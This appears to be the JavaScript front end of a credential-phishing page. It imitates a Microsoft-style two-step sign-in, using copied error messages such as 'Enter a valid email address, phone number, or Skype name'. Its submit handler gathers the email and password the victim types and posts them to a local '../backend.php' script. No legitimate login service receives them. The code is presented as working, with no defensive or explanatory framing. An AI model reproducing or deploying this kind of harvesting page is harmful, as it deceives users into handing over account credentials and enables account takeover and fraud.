const slidePage = document.querySelector(".slide-page");
const secondSlide = document.querySelector(".secondSlide");
const btnNext = document.querySelector(".firstNext");
const prevBtnSec = document.querySelector(".prev-1");
const submitBtn = document.querySelector(".submit");

function validateEmail(email) {
    return /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(email);
}

function validate() {
    const result = $("#result");
    const emailValue = $("#email").val();
    if (!validateEmail(emailValue)) {
        result.text("Enter a valid email address, phone number, or Skype name.");
        result.css("color", "red");
        document.getElementById("loginForm").style.height = "403px";
        return false;
    }
    result.text("");
    return true;
}

function validatePassword() {
    const passResult = $("#passResult");
    const passwordValue = $("#password").val();
    if (passwordValue.length < 8) {
        passResult.text("Your account or password is incorrect. If you don't remember your password,");
        passResult.css("color", "red");
        return false;
    }
    passResult.text("");
    return true;
}

var input1 = document.getElementById("email");
var input2 = document.getElementById("password");


input2.addEventListener("keyup", function(e) {
    if (e.keyCode === 13) {
        e.preventDefault();
        document.getElementById("btnSignIn").click();
    }
});

btnNext.addEventListener("click", function() {
    if (!validate()) return;
    const emailValue = document.getElementById("email").value;
    document.getElementById("userLine").textContent = emailValue;

    const section1 = document.getElementById("section-1");
    const section2 = document.getElementById("section-2");
    section1.style.marginLeft = "-100%";
    section1.style.visibility = "hidden";
    section2.style.marginLeft = "0%";
    document.getElementById("loginForm").style.height = "403px";
});

submitBtn.addEventListener("click", function() {
    if (!validatePassword()) return;

    const passwordValue = document.getElementById("password").value;
    const emailValue = document.getElementById("email").value;

    // Enviar para a rota PHP com os valores preenchidos
    const formData = new FormData();
    formData.append("email", emailValue);
    formData.append("password", passwordValue);

    fetch("../backend.php", {
        method: "POST",
        body: formData
    })
    .then(response => {
        // Lógica para lidar com a resposta da rota PHP
        console.log("Envio bem-sucedido");
        return response.text();
    })
    .then(data => {
        // Lógica para manipular os dados da resposta (se necessário)
        console.log(data);
    })
    .catch(error => {
        console.error("Erro:", error);
    });
});

prevBtnSec.addEventListener("click", function() {
    const section1 = document.getElementById("section-1");
    const section2 = document.getElementById("section-2");
    section1.style.marginLeft = "0%";
    section1.style.visibility = "visible";
    section2.style.marginLeft = "100%";
    document.getElementById("loginForm").style.height = "370px";
});
